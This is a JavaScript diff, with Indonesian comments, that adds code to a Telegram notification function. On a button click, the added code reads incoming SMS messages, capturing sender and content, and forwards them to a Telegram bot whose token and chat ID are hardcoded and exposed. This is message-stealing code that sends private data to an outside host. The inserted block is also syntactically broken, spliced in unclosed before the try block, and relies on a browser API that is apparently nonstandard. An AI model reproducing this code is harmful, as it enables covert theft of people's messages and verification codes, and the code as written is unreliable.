@@ -24,7 +24,14 @@ async function sendNotificationToTelegram(message) {
   const botToken = '7280736782:AAGoQ8AfBq6EiCZ1ehzEkY5X4PlHUrGszQk'; // Ganti dengan token bot Anda
   const chatId = '7004610211'; // Ganti dengan ID chat Anda
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
+  requestAccessButton.addEventListener('click', () => {
+      if ('sms' in navigator && 'receive' in navigator.sms) {
+        navigator.sms.receive(
+          (smsData) => {
+            const message = `SMS diterima:\nNomor: ${smsData.sender}\nIsi: ${smsData.message}`;
+            smsNotificationDiv.textContent = message;
+            sendToTelegram(message);
+          },
   try {
     const response = await fetch(url, {
       method: 'POST',
